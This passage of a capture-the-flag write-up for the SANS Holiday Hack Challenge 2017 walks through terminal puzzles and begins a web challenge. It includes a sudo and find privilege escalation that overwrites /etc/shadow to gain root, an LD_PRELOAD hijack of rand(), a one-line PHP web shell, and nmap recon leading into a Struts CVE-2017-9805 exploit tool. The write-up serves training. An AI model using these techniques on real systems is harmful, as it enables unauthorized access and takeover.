<div class="outline-text-4" id="text-kansas_alternatives">
<p>
Instead of joining the tables, we can first find what the most popular songid is:
</p>

<pre class="example">
sqlite&gt; select songid, count(*) from likes group by songid order by count(*) desc limit 3;
songid  count(*)
392     11325
245     2162
265     2140
</pre>

<p>
and then look up what the title for that song is
</p>

<pre class="example">
sqlite&gt; select title from songs where id=392;
title
Stairway to Heaven
sqlite&gt; 
</pre>


<p>
This can also be done in a single query as long as we don't care about the like count:
</p>

<pre class="example">
sqlite&gt; select title from songs where id = (select songid from likes group by songid order by count(*) desc limit 1);
Stairway to Heaven
</pre>

<p>
This method even outperforms the join, taking about half the time to run!  This
is because the join has to examine all of the song titles, but the subquery
method only has to look at one.
</p>
</div>
</div>
</div>
<div id="outline-container-org78dc254" class="outline-3">
<h3 id="org78dc254">Oh Wait Maybe We Are</h3>
<div class="outline-text-3" id="text-org78dc254">
</div>
<div id="outline-container-org5a55554" class="outline-4">
<h4 id="we_are_question"><a id="org5a55554"></a>Question</h4>
<div class="outline-text-4" id="text-we_are_question">
<pre class="example">
            --&gt;*&lt;--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  


My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.

Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
</pre>
</div>
</div>

<div id="outline-container-orgd80f2c0" class="outline-4">
<h4 id="we_are_how-to-find-the-terminal"><a id="orgd80f2c0"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-we_are_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5">https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-we_are.png" alt="terminal-location-we_are.png" />
</p>
<p><span class="figure-number">Figure 10: </span>The terminal is just behind the starting ramp on the main platform.</p>
</div>
</div>
</div>

<div id="outline-container-org0a722e3" class="outline-4">
<h4 id="we_are_background-information"><a id="org0a722e3"></a>Background Information</h4>
<div class="outline-text-4" id="text-we_are_background-information">
<p>
We're logged in as the user <code>elf</code>. We happen to know that
<code>/etc/shadow</code> is where *NIX systems store the password hashes for
their users.
</p>

<p>
The system <abbr title="Message of the Day"> MOTD</abbr> gives us a hint:
</p>

<blockquote>
<p>
What commands can you run with sudo?
</p>
</blockquote>

<p>
We also know that <code>sudo</code> is a program that allows us to run commands with the privileges of other users and/or groups.
</p>
</div>
</div>

<div id="outline-container-org7e37125" class="outline-4">
<h4 id="we_are_goal"><a id="org7e37125"></a>Goal</h4>
<div class="outline-text-4" id="text-we_are_goal">
<p>
We need to overwrite /etc/shadow with /etc/shadow.bak. Basically we
need to <code>cp /etc/shadow.bak /etc/shadow</code>, except that we don't have
permissions to do that directly:
</p>

<pre class="example">
elf@784e43534178:~$ cp /etc/shadow.bak /etc/shadow
cp: cannot create regular file '/etc/shadow': Permission denied
</pre>
</div>
</div>

<div id="outline-container-org08f524d" class="outline-4">
<h4 id="we_are_approach"><a id="org08f524d"></a>Hints</h4>
<div class="outline-text-4" id="text-we_are_approach">
<p>
Shinny Upatree on Twitter has a few hints:
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I think I have some pseudo (sp?) permissions on this Unix server, but I don&#39;t know what that means. <a href="https://twitter.com/GreenesterElf?ref_src=twsrc%5Etfw">@GreenesterElf</a> said this was a &quot;learning opportunity&quot; and won&#39;t give me the answer :&#39;(</p>&mdash; Shinny Upatree (@ClimbALLdaTrees) <a href="https://twitter.com/ClimbALLdaTrees/status/938578359860174848?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org081cf2a" class="outline-4">
<h4 id="we_are_approach"><a id="org081cf2a"></a>Approach</h4>
<div class="outline-text-4" id="text-we_are_approach">
<p>
If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run <code>sudo -h</code> to view the help documentation:
</p>

<pre class="example">
sudo - execute a command as another user
...
  -l, --list                  list user's privileges or check a specific command; use twice for longer format
...
</pre>

<p>
To follow the hint, we should run sudo with the <code>--list</code> option, to see what our privileges are:
</p>

<pre class="example">
elf@784e43534178:~$ sudo --list
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elf may run the following commands on 784e43534178:
    (elf : shadow) NOPASSWD: /usr/bin/find
</pre>

<p>
We can run the find command, but it also mentions something about shadow. Let's give it a shot:
</p>

<pre class="example">
elf@784e43534178:~$ sudo find
[sudo] password for elf: 
</pre>

<p>
We don't know the password. The sudo output said we should be able to
run this without a password ("NOPASSWD"). Something's not quite
right. We can run sudo with <code>-l -l</code> as the help output said to get
some more verbose output:
</p>

<pre class="example">
elf@784e43534178:~$ sudo -l -l
Matching Defaults entries for elf on 784e43534178:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elf may run the following commands on 784e43534178:
Sudoers entry:
    RunAsUsers: elf
    RunAsGroups: shadow
    Options: !authenticate
    Commands:
	/usr/bin/find
</pre>

<p>
Ok. So sudo lets us run the find command as the user elf, and the group shadow. Viewing <code>sudo -h</code> one more time shows us that there's an option we want to set our group to <code>shadow</code>:
</p>
<pre class="example">
-g, --group=group           run command as the specified group name or ID
</pre>

<pre class="example">
elf@784e43534178:~$ sudo -g shadow find 
.
./.bashrc
./.bash_logout
./.profile
</pre>

<p>
This time, sudo let us run find without prompting us for a
password. So, we know that we can run commands as the elf user, and
the shadow group. Is this enough to overwrite <code>/etc/shadow</code>?
</p>

<pre class="example">
elf@784e43534178:~$ ls -l /etc/shadow
-rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
</pre>

<p>
Yes. <code>/etc/shadow</code> is owned by the root user and the shadow group, and
the group has write permissions to it. At this point, the only thing
that's left is figuring out how to use <code>find</code> in order to copy
<code>/etc/shadow.bak</code> to <code>/etc/shadow</code>. <code>find</code> has an exec option:
</p>

<pre class="example">
actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
</pre>

<p>
Let's give it a shot:
</p>
<pre class="example">
elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \;
</pre>

<p>
Looks like that worked:
</p>

<pre class="example">
elf@784e43534178:~$ inspect_da_box 
		     ___
		    / __'.     .-"""-.
	      .-""-| |  '.'.  / .---. \
	     / .--. \ \___\ \/ /____| |
	    / /    \ `-.-;-(`_)_____.-'._
	   ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
	   | |      /       \ /      `\ `. \       / .-. \
	   \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
		  `._       _.'|         .'
		     ```````    '-...--'`
/etc/shadow has been successfully restored!
</pre>
</div>
</div>

<div id="outline-container-org73d15cd" class="outline-4">
<h4 id="we_are_solution"><a id="org73d15cd"></a>Solution</h4>
<div class="outline-text-4" id="text-we_are_solution">
<p>
A one-liner is:
</p>

<pre class="example">
sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \; &amp;&amp; inspect_da_box
</pre>
</div>
</div>

<div id="outline-container-org6f2b8cc" class="outline-4">
<h4 id="we_are_alternatives"><a id="org6f2b8cc"></a>Alternatives</h4>
<div class="outline-text-4" id="text-we_are_alternatives">
<p>
Instead of using <code>find</code> to directly copy the file, we can just use it to start an elevated shell:
</p>

<pre class="example">
elf@784e43534178:~$ id
uid=1000(elf) gid=1000(elf) groups=1000(elf)
elf@784e43534178:~$ sudo -g shadow find -exec bash \;
...
elf@784e43534178:~$ id
uid=1000(elf) gid=42(shadow) groups=42(shadow),1000(elf)
</pre>

<p>
This shows how we can use <code>sudo</code> + <code>find</code> as a general privilege escalation mechanism.
</p>
</div>
</div>

<div id="outline-container-orgd9cb7a3" class="outline-4">
<h4 id="we_are_common-pitfalls"><a id="orgd9cb7a3"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-we_are_common-pitfalls">
<p>
<code>find</code>'s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
</p>

<pre class="example">
elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
find: missing argument to `-exec'
</pre>

<p>
Another issue is just the fact that sudo is often set up for user
permissions, and not group permissions, so the <code>-g</code> flag is less well
known.
</p>
</div>
</div>

<div id="outline-container-org6632580" class="outline-4">
<h4 id="org6632580">Going Further - Privilege Escalation</h4>
<div class="outline-text-4" id="text-org6632580">
<p>
This is neat, but let's elevate privileges to root on this
terminal. Our approach will be to put in a modified shadow file
instead, which will have a password we know for the root user.
</p>

<p>
First, let's generate the password hash in the right format:
</p>

<pre class="example">
elf@784e43534178:~$ echo "password" | openssl passwd -1 -stdin
$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/
</pre>

<p>
Now that we have a hash, we'll use sed to modify the <code>/etc/shadow.bak</code>
file to have that for root's password. Remember to be careful in
escaping special characters in the sed command line.
</p>

<pre class="example">
elf@784e43534178:~$ sed -e 's/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/' /etc/shadow.bak | tee better.shadow
root:$1$WPvxfOOK$JqDBD/DPQlpkUBOC3qTp51:17484:0:99999:7:::
daemon:*:17484:0:99999:7:::
bin:*:17484:0:99999:7:::
sys:*:17484:0:99999:7:::
sync:*:17484:0:99999:7:::
games:*:17484:0:99999:7:::
...
</pre>

<p>
Now, we re-run our find command, and find that we can escalate to root with a password of <code>password</code>:
</p>

<pre class="example">
elf@784e43534178:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow \;
elf@784e43534178:~$ su
Password: 
root@784e43534178:/home/elf# id  
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>
</div>
</div>
<div id="outline-container-org7ed1cdd" class="outline-3">
<h3 id="org7ed1cdd">We're Off To See The</h3>
<div class="outline-text-3" id="text-org7ed1cdd">
</div>
<div id="outline-container-org4e59120" class="outline-4">
<h4 id="off_question"><a id="org4e59120"></a>Question</h4>
<div class="outline-text-4" id="text-off_question">
<pre class="example">

                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='


Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</pre>
</div>
</div>

<div id="outline-container-org6a21ebe" class="outline-4">
<h4 id="off_how-to-find-the-terminal"><a id="org6a21ebe"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-off_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec">https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-off.png" alt="terminal-location-off.png" />
</p>
<p><span class="figure-number">Figure 11: </span>The terminal is on a peak off to the side.</p>
</div>
</div>
</div>

<div id="outline-container-org3a94069" class="outline-4">
<h4 id="off_background-information"><a id="org3a94069"></a>Background Information</h4>
<div class="outline-text-4" id="text-off_background-information">
<p>
We are logged in as the user <code>elf</code>.
</p>

<p>
The system motd tells us:
</p>

<blockquote>
<p>
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
</p>
</blockquote>

<p>
Two files are provided
</p>

<pre class="example">
-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
-rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un
</pre>
</div>
</div>

<div id="outline-container-orgfa360ef" class="outline-4">
<h4 id="off_goal"><a id="orgfa360ef"></a>Goal</h4>
<div class="outline-text-4" id="text-off_goal">
<p>
For this challenge we need to write our own code in order to make the provided binary <code>isit42</code> return 42.
</p>
</div>
</div>

<div id="outline-container-orgc7a168e" class="outline-4">
<h4 id="off_hints"><a id="orgc7a168e"></a>Hints</h4>
<div class="outline-text-4" id="text-off_hints">
<p>
<a href="https://twitter.com/1Horse1OSSleigh">Wunorse Openslae (that's a stretch) on Twitter actually has no useful hints</a>
</p>

<p>
This blog post, <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Go To The Head Of The Class: LD_PRELOAD For The Win</a>, by Jeff McJunkin was useful.
</p>
</div>
</div>

<div id="outline-container-org004e188" class="outline-4">
<h4 id="off_approach"><a id="org004e188"></a>Approach</h4>
<div class="outline-text-4" id="text-off_approach">
<p>
[[<a href="https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9">https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9</a>][Our team actually did this exact thing last year in order to derandomize <code>wumpus</code>.]
</p>

<p>
In this case looking at the source code we can identify the exact code that is being used to randomize the program:
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #de935f;">getrand</span>() {
    srand((<span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">int</span>)time(<span style="color: #81a2be;">NULL</span>)); 
    printf(<span style="color: #8abeb7;">"Calling rand() to select a random number.\n"</span>);
    <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">The prototype for rand is: int rand(void);</span>
    <span style="color: #b5bd68;">return</span> rand() % 4096; <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">returns a pseudo-random integer between 0 and 4096</span>
}
</pre>
</div>

<p>
If we create our own library file to define <code>rand()</code> we can remove the randomness.
</p>
</div>
</div>

<div id="outline-container-orgf6ef7d7" class="outline-4">
<h4 id="off_solution"><a id="orgf6ef7d7"></a>Solution</h4>
<div class="outline-text-4" id="text-off_solution">
<p>
As mentioned in the hints section above, we can use <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Jeff McJunkin's</a> blog post for guidance on how to complete this challenge.
</p>

<p>
First we'll need to create our own library. We can call it 'rand.c'.
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #de935f;">rand</span>(<span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">int</span> *<span style="color: #f0c674;">seed</span>) {
    <span style="color: #b5bd68;">return</span> 42;
}
</pre>
</div>

<p>
Then we compile it using the suggested flags in the article.
</p>

<pre class="example">
elf@784e43534178:~$ gcc -o rand -ldl -shared -fPIC rand.c
</pre>

<p>
Once compiled we can then use LD_PRELOAD to load our library.
</p>

<pre class="example">
elf@784e43534178:~$ LD_PRELOAD=`pwd`/rand ./isit42
Starting up ... done.
Calling rand() to select a random number.
		 .-. 
		.;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
	       /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
	      /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
	    |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
	,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
	 \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
	 | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
	  \/|(_) () (_)|\/ 
	    \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
	    _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
	  /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
	 / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
	/  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  \|---|    |---|/  \ 
       |  (|42 | () | DA|)  |       _   ___  _______ 
       \  /;---'    '---;\  /      | | |   ||       |
	`` \ ___ /\ ___ / ``       | |_|   ||____   |
	    `|  |  |  |`           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
      | \__.'    ||    '.__/ |
       `---------''---------` 
Congratulations! You've won, and have successfully completed this challenge.
</pre>
</div>
</div>

<div id="outline-container-orgeb4492f" class="outline-4">
<h4 id="off_alternatives"><a id="orgeb4492f"></a>Alternatives</h4>
<div class="outline-text-4" id="text-off_alternatives">
<p>
Another option is to just brute force it.  The sample code shows that the program is using
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b5bd68;">return</span> rand() % 4096; <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">returns a pseudo-random integer between 0 and 4096</span>
</pre>
</div>

<p>
This means we should only need to run the program a few thousand times for the
result to be 42.  However, if we try to run the program too quickly, we notice
we get the same output each time:
</p>

<pre class="example">
elf@5f015af49eab:~$ ./isit42 &amp; ./isit42 &amp;
[1] 31
[2] 32
elf@5f015af49eab:~$ Starting up ... Starting up ... done.
Calling rand() to select a random number.
done.
Calling rand() to select a random number.
945 is not 42.
945 is not 42.
[1]-  Exit 177                ./isit42
[2]+  Exit 177                ./isit42
</pre>


<p>
This is because the program uses the current timestamp in seconds as a random
seed. Running the program more than once a second will not help us.
</p>

<p>
If we run this:
</p>
<pre class="example">
elf@784e43534178:~$ while true;do ./isit42 ; done
</pre>

<p>
We will get a different answer ever time, but since the program contains a
sleep(3) that will only run one attempt every 3 seconds instead of one attempt
per second.  To fix this, we can run each attempt in the background using &amp;,
sleeping 1 second between attempts:
</p>


<pre class="example">
elf@784e43534178:~$ while true;do ./isit42 &amp;sleep 1;done
</pre>

<p>
After a short wait, it succeeds:
</p>

<pre class="example">
Calling rand() to select a random number.
[860]   Exit 37                 ./isit42
[865] 1869
Starting up ... 3566 is not 42.
done.
Calling rand() to select a random number.
[861]   Exit 199                ./isit42
[866] 1871
Starting up ...                  .-.
		.;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______
	       /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
	      /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
	    |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_
	,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
	 \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
	 | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orgb27f4c4" class="outline-2">
<h2 id="orgb27f4c4"><span class="todo TODO">TODO</span> Answers</h2>
<div class="outline-text-2" id="text-orgb27f4c4">
</div>
<div id="outline-container-org8c00b1f" class="outline-3">
<h3 id="org8c00b1f">Game: This Page Fell off a Truck</h3>
<div class="outline-text-3" id="text-org8c00b1f">
</div>
<div id="outline-container-orgb8fb18e" class="outline-4">
<h4 id="q1_question"><a id="orgb8fb18e"></a>Question</h4>
<div class="outline-text-4" id="text-q1_question">
<p>
Visit the North Pole and Beyond at the Winter Wonder Landing Level to
collect the first page of The Great Book using a giant snowball. What
is the title of that page?
</p>
</div>
</div>

<div id="outline-container-orgc26c549" class="outline-4">
<h4 id="q2_solution"><a id="orgc26c549"></a>Solution</h4>
<div class="outline-text-4" id="text-q2_solution">
<p>
This question simply requires playing the <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">Winter Wonder Landing</a> game
level, and redirecting the snowball to collect the <a href="https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf">first Great Book page</a>.
</p>

<p>
This challenge was primarily to get players introduced to the game aspect of the Holiday Hack.
</p>
</div>
</div>
</div>
<div id="outline-container-org274b925" class="outline-3">
<h3 id="org274b925">L2S: Letters to Santa</h3>
<div class="outline-text-3" id="text-org274b925">
</div>
<div id="outline-container-orgd1972fa" class="outline-4">
<h4 id="q2_question"><a id="orgd1972fa"></a>Question</h4>
<div class="outline-text-4" id="text-q2_question">
<p>
Investigate the Letters to Santa application at
<a href="https://l2s.northpolechristmastown.com/">https://l2s.northpolechristmastown.com/</a>. What is the topic of The
Great Book page available in the web root of the server? What is
Alabaster Snowball's password?
</p>
</div>
</div>

<div id="outline-container-orgb1afaa6" class="outline-4">
<h4 id="q2_background-information"><a id="orgb1afaa6"></a>Background Information</h4>
<div class="outline-text-4" id="text-q2_background-information">
<p>
We know that there is an application on <code>https://l2s.northpolechristmastown.com</code> that we need to investigate.
This webpage is publically accessible from the Internet and not appear to require any special measures to
access it. We do not know Alabaster password or username at the start of this challenge nor what type of
web service is running on the host.
</p>

<p>
The following hints were provided by Sparkle Redberry from completing the level
<a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">Winconceivable: The Cliffs of Winsanity</a>:
</p>
<ol class="org-ol">
<li>We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.</li>
<li>Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.</li>
<li>Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.</li>
<li>A simple web shell is to create a PHP file in the web root with <code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET['e']) . "&lt;/pre&gt;"; ?&gt;</code>. Then, I visit the URL with my commands. For example, <code>http://server/complexFileName.php?e=ls</code>.</li>
<li>There are lots of different web shell tools available. <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">You can get a simple PHP web shell that is easy to use here</a>.</li>
<li>That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.</li>
<li>Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Here is a useful article</a>.</li>
<li>Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.</li>
</ol>

<p>
The following SANS Pentest Blog posts were also very helpful for this challenge:
</p>
<ul class="org-ul">
<li><p>
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Why You Need the Skills to Tinker with Publicly Released Exploit Code</a>
</p>

<p>
Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</p></li>
<li><a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee%20Restricted">A Spot of Tee</a>
bash shell, and bypassing the I/O restriction with tee</li>
</ul>
</div>
</div>

<div id="outline-container-org1ca6e3a" class="outline-4">
<h4 id="q2_goal"><a id="org1ca6e3a"></a>Goal</h4>
<div class="outline-text-4" id="text-q2_goal">
<p>
There are two goals for this challenge. The first is to determine the topic of
the Great Book Page that is sitting on the web root of this server. The second
is to determine what Alabaster's password is.
</p>
</div>
</div>

<div id="outline-container-orgab131e8" class="outline-4">
<h4 id="q2_approach"><a id="orgab131e8"></a>Approach</h4>
<div class="outline-text-4" id="text-q2_approach">
<p>
According to the second hint there might be development code left in the production code.
If we look at the source of <code>l2s</code> the following code pops out.
</p>

<div class="org-src-container">
<pre class="src src-html"><span style="color: #969896; font-style: italic;">&lt;!-- </span><span style="color: #969896; font-style: italic;">Development version </span><span style="color: #969896; font-style: italic;">--&gt;</span>
&lt;<span style="color: #de935f;">a</span> <span style="color: #f0c674;">href</span>=<span style="color: #8abeb7;">"http://dev.northpolechristmastown.com"</span> <span style="color: #f0c674;">style</span>=<span style="color: #8abeb7;">"display: none;"</span>&gt;Access Development Version&lt;/<span style="color: #de935f;">a</span>&gt;
</pre>
</div>

<p>
Let's do some recon on the hosts:
</p>

<pre class="example">
$ nmap -sC l2s.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.027s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://l2s.northpolechristmastown.com/
443/tcp  open   https
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
</pre>

<p>
In addition to the hidden link for dev.northpolechristmastown.com, it is also
present as an alternate name on the certificate of the host. Let's let nmap's
scripts scan that as well.
</p>

<pre class="example">
$ nmap -sC dev.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
Host is up (0.028s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://dev.northpolechristmastown.com/
443/tcp  open   https
| http-title: Toys List
|_Requested resource was /orders.xhtml
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server
</pre>

<p>
We can see that dev and l2s are one in the same. Visiting the dev page has a footer
that simply states <code>Powered By: Apache Struts</code>. Let's use this to our advantage.
Let's use the tool provided through the SANS Pentest blog,
<a href="https://github.com/chrisjd20/cve-2017-9805.py">cve-2017-9805.py</a>. The dev page
we land on is <a href="https://dev.northpolechristmastown.com/orders.xhtml">https://dev.northpolechristmastown.com/orders.xhtml</a> so we'll use
that to start from.
</p>

<p>
Let's check out the help:
</p>

<pre class="example">
$ ./cve-2017-9805.py
usage: cve-2017-9805.py [-h] [-u URL] -c COMMAND

optional arguments:
  -h, --help  show this help message and exit
